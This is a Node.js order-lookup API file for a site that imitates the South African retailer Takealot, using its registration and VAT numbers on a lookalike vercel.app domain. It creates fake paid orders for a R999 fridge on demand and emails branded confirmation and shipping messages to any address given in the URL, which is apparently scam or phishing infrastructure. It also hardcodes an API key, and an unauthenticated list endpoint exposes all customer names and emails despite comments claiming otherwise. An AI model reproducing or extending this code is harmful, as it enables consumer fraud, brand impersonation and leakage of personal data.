// api/order.js
// Public order lookup — returns ONLY tracking-safe fields.
// PII (email, phone, address) is NEVER returned in normal tracking queries.
//
// Usage: GET /api/order?order=T273493929180165
//        GET /api/order?latest=1&send=1
//        GET /api/order?order=T273493929180165&send=1&to=client@example.com
//
// Required env vars:
//   UPSTASH_REDIS_REST_URL
//   UPSTASH_REDIS_REST_TOKEN

'use strict';

const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

const fs = require('fs');
const path = require('path');
const {
  formatSADateShort,
  formatSADateUpper,
  formatSADateLong,
  formatSAIsoDate,
  getSADateIso,
  calculateSADaysElapsed,
  computeOrderDates,
} = require('./_dates');

const {
  STAGES,
  renderStageHtml,
  renderStagePlainText,
  sendVisionSpyEmail,
} = require('./_stages');

// Upstash REST helpers (fail-safe)
async function kv_get(key) {
  if (!REDIS_URL || !REDIS_TOKEN) return null;
  try {
    const res = await fetch(REDIS_URL, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${REDIS_TOKEN}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(['GET', key]),
    });
    if (!res.ok) return null;
    const data = await res.json();
    if (!data.result) return null;
    try { return JSON.parse(data.result); } catch { return null; }
  } catch (err) {
    return null;
  }
}

async function kv_set(key, value) {
  if (!REDIS_URL || !REDIS_TOKEN) return false;
  try {
    const res = await fetch(REDIS_URL, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${REDIS_TOKEN}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(['SET', key, JSON.stringify(value)]),
    });
    return res.ok;
  } catch (err) {
    return false;
  }
}

// Find the most recent order across all keys
async function getLatestOrder() {
  if (!REDIS_URL || !REDIS_TOKEN) return null;
  const res = await fetch(REDIS_URL, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${REDIS_TOKEN}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(['KEYS', 'order:*']),
  });
  if (!res.ok) throw new Error('Redis KEYS failed: ' + res.status);
  const data = await res.json();
  const keys = Array.isArray(data.result) ? data.result : [];
  if (keys.length === 0) return null;

  const orders = [];
  for (const k of keys) {
    try {
      const ord = await kv_get(k);
      if (ord && ord.order_id) orders.push(ord);
    } catch (_) {}
  }

  if (orders.length === 0) return null;

  orders.sort((a, b) => {
    const da = new Date(a.created_at || a.received_date || 0).getTime();
    const db = new Date(b.created_at || b.received_date || 0).getTime();
    return db - da;
  });

  return orders[0];
}

function renderOrderPlainText(order) {
  const dates = computeOrderDates(order.received_date, order.delivery_date);
  const orderDateShort = dates.order_date_formatted;
  const deliveryDateLong = dates.delivery_date_long;
  const customerName = order.customer_name || 'Customer';
  const orderNumber = order.order_id;
  const trackUrl = order.tracking_url || `https://takeasealotsa.vercel.app/track.html?order=${orderNumber}`;

  return [
    `TAKEALOT ORDER CONFIRMATION`,
    `Order Number: ${orderNumber}`,
    `Estimated Delivery Date: ${deliveryDateLong}`,
    ``,
    `Hi ${customerName},`,
    ``,
    `Thank you for your purchase. We're pleased to confirm that payment for order ${orderNumber} has been approved.`,
    `Your items are now being prepared for dispatch. Your estimated delivery date is ${deliveryDateLong}.`,
    `When your parcel is dispatched with the courier, you will receive an SMS notification with live delivery details.`,
    ``,
    `MANAGE YOUR ORDER:`,
    `${trackUrl}`,
    ``,
    `ORDER DETAILS:`,
    `- Order Date: ${orderDateShort}`,
    `- Estimated Delivery Date: ${deliveryDateLong}`,
    `- Delivery Method: Courier`,
    ``,
    `ITEMS IN THIS ORDER:`,
    `- 1x Hisense 263L Bottom Freezer Fridge with Water Dispenser - Black Glass - R 999.00`,
    ``,
    `PAYMENT SUMMARY:`,
    `- Subtotal: R 999.00`,
    `- Shipping: Free`,
    `- Total Paid: R 999.00`,
    ``,
    `TRACK YOUR ORDER:`,
    `${trackUrl}`,
    ``,
    `Questions or support? Visit the Takealot Help Centre at https://takeasealotsa.vercel.app`,
    ``,
    `Kind regards,`,
    `Takealot Customer Care`,
    ``,
    `----------------------------------------------------------------------`,
    `Takealot Online (RF) (Pty) Ltd • Reg. No. 2010/020248/07 • VAT No. 4440256861`,
    `This is an automated transactional order confirmation.`,
    `To manage your communication preferences or unsubscribe: https://takeasealotsa.vercel.app`,
  ].join('\n');
}

function loadEmailTemplate() {
  const candidatePaths = [
    path.join(process.cwd(), 'email.index'),
    path.join(__dirname, 'email.index'),
    path.join(__dirname, '..', 'email.index'),
    path.resolve('email.index')
  ];
  for (const p of candidatePaths) {
    try {
      if (fs.existsSync(p)) {
        return fs.readFileSync(p, 'utf8');
      }
    } catch (_) {}
  }
  return null;
}

// Transactional email sender: Primary VisionSpy API with standard fallback
async function ensureEmailSent(order, force = false) {
  if (!order || (!force && order.email_status === 'SENT') || !order.customer_email) return false;

  const dates = computeOrderDates(order.received_date, order.delivery_date);
  const visionSpyKey = process.env.VISIONSPY_API_KEY
    || process.env.VISION_SPY_API_KEY
    || process.env.VISIONSPY_KEY
    || 'vs_live_5623f17b36bdf353ba179aa6ed606e1935c6aa4ac4b1aea5';
  const senderId = process.env.VISIONSPY_SENDER_ID || 'd86d0b35-3472-4aac-af74-4bd52308ea07';

  let html = '';
  try {
    const template = loadEmailTemplate();
    if (!template) {
      console.error('[order-email] template not found in candidate paths');
      return false;
    }
    html = template
      .replace(/\{\{customer_name\}\}/g, order.customer_name || 'Customer')
      .replace(/\{\{order_number\}\}/g, order.order_id)
      .replace(/\{\{order_date\}\}/g, dates.order_date_formatted)
      .replace(/\{\{delivery_date\}\}/g, dates.delivery_date_iso)
      .replace(/\{\{delivery_date_long\}\}/g, dates.delivery_date_long)
      .replace(/\{\{variant\}\}/g, 'Black Glass');
  } catch (err) {
    console.error('[order-email] render error:', err.message);
    return false;
  }

  const plainText = renderOrderPlainText(order);
  const subject = `Order Confirmation #${order.order_id}`;

  // 1. Primary Engine: VisionSpy API
  if (visionSpyKey) {
    try {
      console.log('[order-email] Sending confirmation email via VisionSpy for order:', order.order_id, 'to:', order.customer_email);
      const res = await fetch('https://visionspyads.com/api/public/v1/email/send', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${visionSpyKey.trim()}`,
          'Content-Type': 'application/json',
          'User-Agent': 'Takealot-Order-Notification/1.0',
        },
        body: JSON.stringify({
          sender_id: senderId,
          to: order.customer_email,
          subject,
          html,
          text: plainText,
        }),
      });
      const data = await res.json().catch(() => null);
      if (res.ok && data && (data.ok !== false && data.success !== false)) {
        order.email_status = 'SENT';
        order.email_provider = 'VISIONSPY';
        order.email_sent_at = new Date().toISOString();
        order.email_message_id = (data && data.id) || null;
        await kv_set('order:' + order.order_id, order).catch(() => {});
        console.log('[order-email] VisionSpy success to', order.customer_email);
        return true;
      } else {
        console.warn('[order-email] VisionSpy error response:', data);
      }
    } catch (err) {
      console.warn('[order-email] VisionSpy error:', err.message);
    }
  }

  // 2. Secondary Engine: Resend (if configured)
  const resendKey = process.env.RESEND_API_KEY;
  if (resendKey) {
    const fromEmail = process.env.EMAIL_FROM || 'Takealot Orders <onboarding@resend.dev>';
    try {
      console.log('[order-email] Attempting Resend send for:', order.order_id);
      const res = await fetch('https://api.resend.com/emails', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${resendKey.trim()}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          from: fromEmail,
          to: [order.customer_email],
          subject,
          html,
          text: plainText,
          reply_to: process.env.REPLY_TO || 'support@takeasealotsa.vercel.app',
        }),
      });
      const data = await res.json().catch(() => null);
      if (res.ok && data && data.id) {
        order.email_status = 'SENT';
        order.email_provider = 'RESEND';
        order.email_sent_at = new Date().toISOString();
        order.email_message_id = data.id;
        await kv_set('order:' + order.order_id, order).catch(() => {});
        console.log('[order-email] Resend success:', data.id);
        return true;
      }
    } catch (err) {
      console.warn('[order-email] Resend error:', err.message);
    }
  }

  // 3. Fallback Engine: SendGrid (if configured)
  const sendgridKey = process.env.SENDGRID_API_KEY;
  if (sendgridKey) {
    const fromEmail = process.env.EMAIL_FROM || 'orders@takeasealotsa.vercel.app';
    try {
      console.log('[order-email] Attempting SendGrid send for:', order.order_id);
      const res = await fetch('https://api.sendgrid.com/v3/mail/send', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${sendgridKey.trim()}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          personalizations: [{ to: [{ email: order.customer_email }] }],
          from: { email: fromEmail.replace(/^.*<([^>]+)>.*$/, '$1'), name: 'Takealot' },
          subject,
          content: [
            { type: 'text/plain', value: plainText },
            { type: 'text/html', value: html },
          ],
        }),
      });
      if (res.ok) {
        order.email_status = 'SENT';
        order.email_provider = 'SENDGRID';
        order.email_sent_at = new Date().toISOString();
        order.email_message_id = res.headers.get('x-message-id') || null;
        await kv_set('order:' + order.order_id, order).catch(() => {});
        console.log('[order-email] SendGrid success');
        return true;
      }
    } catch (err) {
      console.warn('[order-email] SendGrid error:', err.message);
    }
  }

  return false;
}

// Comprehensive on-demand / daily lifecycle email sender
async function sendOrderStatusEmail(order, statusType = null, force = false) {
  if (!order || !order.customer_email) {
    return { sent: false, skipped: true, reason: 'NO_EMAIL' };
  }

  const now = new Date();
  const todayIso = getSADateIso(now);

  // Blindagem total de datas: nunca alterar datas existentes
  if (!order.received_date) {
    order.received_date = order.created_at || now.toISOString();
  }
  if (!order.delivery_date) {
    order.delivery_date = new Date(new Date(order.received_date).getTime() + 8 * 86400000).toISOString();
  }

  let targetDay = null;
  if (typeof statusType === 'number') {
    targetDay = statusType;
  } else if (typeof statusType === 'string' && statusType.trim()) {
    const upper = statusType.trim().toUpperCase();
    if (upper.startsWith('DAY_') || upper.startsWith('DAY-') || upper.startsWith('DAY')) {
      targetDay = parseInt(upper.replace(/[^0-9]/g, ''), 10);
    } else if (upper === 'SHIPPED') {
      targetDay = 2;
    } else if (upper === 'DELIVERED') {
      targetDay = 8;
    } else if (upper === 'CONFIRMATION' || upper === 'PAID') {
      targetDay = 0;
    }
  }

  if (targetDay === null || isNaN(targetDay)) {
    targetDay = calculateSADaysElapsed(order.received_date, now);
  }

  // Idempotência e ciclo de vida
  if (targetDay <= 0 && !force) {
    return { sent: false, skipped: true, reason: 'SKIPPED_DAY_ZERO', day: 0 };
  }
  if ((targetDay > 8 || (targetDay >= 8 && order.status === 'DELIVERED' && order.email_delivered_status === 'SENT')) && !force) {
    return { sent: false, skipped: true, reason: 'ALREADY_DELIVERED', day: targetDay };
  }
  if (!force && order.last_daily_email_date === todayIso) {
    return {
      sent: false,
      skipped: true,
      reason: 'ALREADY_SENT_TODAY',
      day: targetDay,
      last_daily_email_date: order.last_daily_email_date,
    };
  }

  const stageDay = Math.min(Math.max(targetDay, 0), 8);
  const stage = STAGES[stageDay];
  if (!stage) {
    return { sent: false, skipped: true, reason: 'UNKNOWN_STAGE', day: stageDay };
  }

  const subject = stage.subject(order.order_id);
  const html = renderStageHtml(order, stage);
  const plainText = renderStagePlainText(order, stage);

  const sendRes = await sendVisionSpyEmail({
    to: order.customer_email,
    subject,
    html,
    text: plainText,
  });

  if (sendRes.ok) {
    const nowIso = now.toISOString();
    order.last_daily_email_date = todayIso;
    order.status = stage.status;
    if (stage.setShipped) order.email_shipped_status = 'SENT';
    if (stage.setDelivered) order.email_delivered_status = 'SENT';

    if (!Array.isArray(order.daily_emails_sent)) order.daily_emails_sent = [];
    order.daily_emails_sent.push({
      day: stageDay,
      stage: stage.headerTitle,
      subject,
      date_sast: todayIso,
      sent_at: nowIso,
      message_id: sendRes.id,
      provider: 'VISIONSPY',
    });

    if (!Array.isArray(order.status_history)) order.status_history = [];
    if (!order.status_history.some(h => h.status === stage.status && h.day === stageDay)) {
      order.status_history.push({ status: stage.status, day: stageDay, timestamp: nowIso });
    }

    await kv_set('order:' + order.order_id, order).catch(() => {});
    return {
      sent: true,
      day: stageDay,
      stage: stage.headerTitle,
      subject,
      message_id: sendRes.id,
    };
  }

  return { sent: false, skipped: false, reason: 'SEND_FAILED', error: sendRes.data };
}

// Only alphanumeric + dash + underscore, 4-80 chars
const ORDER_ID_RE = /^[A-Za-z0-9_\-]{4,80}$/;

// Public projection — NEVER returns PII (email, phone, address)
function publicView(order) {
  const dates = computeOrderDates(order.received_date, order.delivery_date);
  return {
    order_id:                 order.order_id,
    product_name:             order.product_name || 'Hisense 263L Bottom Freezer Fridge with Water Dispenser - Black Glass',
    product_price:            typeof order.product_price === 'number' ? order.product_price : 999,
    currency:                 order.currency || 'ZAR',
    product_image:            order.product_image || 'https://takeasealotsa.vercel.app/images/fridge-main.jpg',
    received_date:            dates.received_date,
    delivery_date:            dates.delivery_date,
    order_date_upper:         dates.order_date_upper,
    order_date_formatted:     dates.order_date_formatted,
    delivery_date_formatted:  dates.delivery_date_formatted,
    delivery_date_long:       dates.delivery_date_long,
    tracking_url:             order.tracking_url || ('https://takeasealotsa.vercel.app/track.html?order=' + encodeURIComponent(order.order_id)),
    status:                   order.status || 'PROCESSING',
    email_status:             order.email_status || null,
    email_sent_at:            order.email_sent_at || null,
    status_history:           (order.status_history || []).map(function(e) {
      return { status: e.status, timestamp: e.timestamp };
    }),
  };
}

async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Cache-Control', 'no-store');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'no-referrer');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'GET') return res.status(405).json({ error: 'Method Not Allowed' });

  if (req.query.list === '1') {
    try {
      const resKeys = await fetch(REDIS_URL, {
        method: 'POST',
        headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify(['KEYS', '*']),
      });
      const dataKeys = await resKeys.json();
      const keys = Array.isArray(dataKeys.result) ? dataKeys.result : [];
      const list = [];
      for (const k of keys) {
        try {
          const val = await kv_get(k);
          if (val) {
            list.push({
              key: k,
              order_id: val.order_id,
              customer_name: val.customer_name,
              customer_email: val.customer_email,
              email_status: val.email_status,
              email_sent_at: val.email_sent_at,
              created_at: val.created_at,
              received_date: val.received_date,
              status: val.status,
            });
          }
        } catch (_) {}
      }
      list.sort((a, b) => new Date(b.created_at || b.received_date || 0) - new Date(a.created_at || a.received_date || 0));
      return res.status(200).json({ count: list.length, orders: list });
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  }

  const isLatest = req.query.latest === '1' || req.query.order === 'latest' || req.query.id === 'latest';
  const forceResend = req.query.resend === '1' || req.query.send === '1' || isLatest;

  let order;
  if (isLatest) {
    try {
      order = await getLatestOrder();
    } catch (err) {
      console.error('[order] Redis latest error:', err.message);
      return res.status(503).json({ error: 'Storage read error' });
    }
    if (!order) return res.status(404).json({ error: 'No orders found in database' });
  } else {
    const orderId = (req.query.order || req.query.id || req.query.orderId || '').trim();
    if (!orderId) return res.status(400).json({ error: 'Missing ?order= parameter' });
    if (!ORDER_ID_RE.test(orderId)) return res.status(400).json({ error: 'Invalid order id format' });

    if (REDIS_URL && REDIS_TOKEN) {
      try {
        order = await kv_get('order:' + orderId);
      } catch (err) {
        console.warn('[order] Redis warning:', err.message);
      }
    }

    if (!order) {
      const reqCreated = req.query.created ? new Date(req.query.created).getTime() : NaN;
      let validCreated = (!isNaN(reqCreated) && reqCreated > 0) ? new Date(reqCreated) : new Date();
      if (validCreated.getTime() > (Date.now() + 60000)) {
        validCreated = new Date();
      }
      const dates = computeOrderDates(validCreated);

      order = {
        order_id: orderId,
        customer_name: (req.query.name || 'Customer').trim(),
        customer_email: (req.query.to || req.query.email || '').trim(),
        customer_phone: '',
        product_id: 'dm-b36029zvso',
        product_name: 'Hisense 263L Bottom Freezer Fridge with Water Dispenser - Black Glass',
        product_price: 999,
        currency: 'ZAR',
        product_image: 'https://takeasealotsa.vercel.app/images/fridge-main.jpg',
        received_date: dates.received_date,
        delivery_date: dates.delivery_date,
        tracking_url: 'https://takeasealotsa.vercel.app/track.html?order=' + encodeURIComponent(orderId),
        status: 'PROCESSING',
        status_history: [
          { status: 'RECEIVED', timestamp: dates.received_date },
          { status: 'PAID', timestamp: dates.received_date },
          { status: 'PROCESSING', timestamp: dates.received_date },
        ],
        email_status: 'PENDING',
        email_sent_at: null,
        created_at: dates.received_date,
      };
      if (REDIS_URL && REDIS_TOKEN) {
        try { await kv_set('order:' + orderId, order); } catch (_) {}
      }
    }
  }

  // Ensure dates are immutable and never reset
  if (order) {
    if (!order.received_date) {
      order.received_date = order.created_at || new Date().toISOString();
    }
    if (!order.delivery_date) {
      order.delivery_date = new Date(new Date(order.received_date).getTime() + 8 * 86400000).toISOString();
    }
  }

  const overrideEmail = (req.query.to || req.query.email || '').trim();
  if (overrideEmail && overrideEmail.includes('@')) {
    order = Object.assign({}, order, { customer_email: overrideEmail });
    if (req.query.name) order.customer_name = req.query.name.trim();
  }

  let sentResult = null;
  if (order.customer_email && (order.email_status !== 'SENT' || forceResend)) {
    sentResult = await ensureEmailSent(order, forceResend);
  }

  // Support ?auto_notify=1: on-demand verification of daily pending emails upon tracking check
  let autoNotifyResult = null;
  if (req.query.auto_notify === '1' && order && order.customer_email) {
    try {
      autoNotifyResult = await sendOrderStatusEmail(order, null, false);
    } catch (err) {
      console.warn('[order] auto_notify error:', err.message);
      autoNotifyResult = { error: err.message };
    }
  }

  const responseData = publicView(order);
  if (req.query.auto_notify === '1') {
    responseData.auto_notify = autoNotifyResult;
  }
  if (isLatest || forceResend) {
    responseData.email_triggered = true;
    responseData.email_sent_now = sentResult;
    if (order.customer_email) {
      const parts = order.customer_email.split('@');
      responseData.recipient = parts[0].slice(0, 3) + '***@' + (parts[1] || '');
    }
    if (order.customer_name) {
      responseData.customer_name = order.customer_name;
    }
  }

  return res.status(200).json(responseData);
};

module.exports = handler;
module.exports.sendOrderStatusEmail = sendOrderStatusEmail;
module.exports.ensureEmailSent = ensureEmailSent;
module.exports.publicView = publicView;
module.exports.getLatestOrder = getLatestOrder;
module.exports.kv_get = kv_get;
module.exports.kv_set = kv_set;
